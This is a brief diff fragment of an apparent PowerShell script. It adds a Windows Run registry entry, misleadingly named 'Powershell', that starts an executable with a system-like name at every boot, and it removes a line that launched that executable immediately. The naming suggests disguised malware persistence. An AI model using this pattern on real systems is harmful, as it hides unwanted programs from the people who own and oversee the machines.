@@ -7,4 +7,3 @@ $programPath = "C:\Windows\System\usermodefontdriverhost.exe"
 $command = "C:\Windows\System\usermodefontdriverhost.exe"
 
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
-Start-Process "C:\Windows\System\usermodefontdriverhost.exe"
